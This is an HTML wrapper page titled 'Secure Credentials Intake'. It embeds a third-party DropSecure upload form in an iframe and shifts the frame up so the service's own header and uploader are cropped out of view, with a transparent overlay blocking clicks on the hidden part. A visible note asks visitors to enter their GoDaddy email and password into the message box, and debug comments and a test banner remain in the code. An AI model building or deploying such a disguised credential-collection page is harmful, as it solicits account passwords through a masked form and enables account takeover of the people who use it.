<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Secure Credentials Intake</title>
<style>
  /* BIG crop so we can SEE it working */
  :root {
    --offset: 600px;   /* hide 600px from the top */
    --vh: 1200px;      /* visible height of the box */
  }

  /* Loud banner so we know the wrapper is active */
  .build-check {
    padding: 10px;
    background: #ffeb3b;
    color: #111;
    font: 700 14px/1 system-ui, -apple-system, Segoe UI, Roboto, Arial;
    text-align: center;
  }

  .viewport {
    position: relative;
    width: 100%;
    height: var(--vh);
    overflow: hidden;               /* CROPS the top of the iframe */
    border: 1px solid #ddd;
    border-radius: 12px;
    background: #fff;
    box-sizing: border-box;
  }

  .note {
    position: sticky; top: 0; z-index: 11;
    display: flex; align-items: center; justify-content: center;
    min-height: 46px; padding: 10px 14px;
    font: 600 14px/1.3 system-ui, -apple-system, Segoe UI, Roboto, Arial;
    color:#222; background:#fff; border-bottom:1px solid #eee;
  }

  .ds-frame {
    position: absolute; inset: 0; border: 0; width: 100%;
    height: calc(var(--vh) + var(--offset) + 800px); /* keep taller than viewport */
    transform: translateY(calc(var(--offset) * -1)); /* SHIFT UP to hide top */
  }

  /* Click blocker over the cropped area so the hidden uploader can't be used */
  .click-shield {
    position: absolute; left:0; top:0; right:0; height: var(--offset);
    pointer-events: auto; background: transparent; z-index: 10;
  }

  @media (max-width: 640px) {
    :root { --offset: 700px; --vh: 1300px; } /* extra on mobile */
  }
</style>
</head>
<body>

  <div class="build-check">WRAPPER ACTIVE â€” if you see this, cropping is enabled.</div>

  <div class="viewport">
    <div class="note">Enter your GoDaddy Email (line 1) and Password (line 2) in the message box below.</div>

    <iframe
      class="ds-frame"
      src="https://websmartz.dropsecure.com/send/46f23185-34d3-4346-9673-60e62f9a9ea7"
      title="Secure Credentials Intake"></iframe>

    <div class="click-shield" aria-hidden="true"></div>
  </div>

</body>
</html>
